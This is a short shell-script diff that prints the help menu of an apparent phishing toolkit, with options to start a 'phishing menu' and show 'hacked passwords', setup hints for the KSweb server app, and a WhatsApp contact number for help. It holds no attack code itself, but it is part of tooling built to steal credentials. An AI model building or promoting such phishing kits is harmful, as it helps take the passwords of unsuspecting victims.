@@ -1,0 +1,18 @@
+
+echo ""
+echo ""
+echo ""
+echo "sh help  - OPENS THIS MENU"
+echo "sh start - STARTS THE PHISHING MENU"
+echo "sh show  - SHOW HACKED PASSWORDS"
+echo ""
+echo KSweb App is need is need to start server
+echo Make sure you installed KSweb App
+echo call king pinnocent to help you
+echo ""
+echo "whatsapp number +2347044838902"
+echo ""
+echo ""
+echo ""
+read pause
+sh .menu
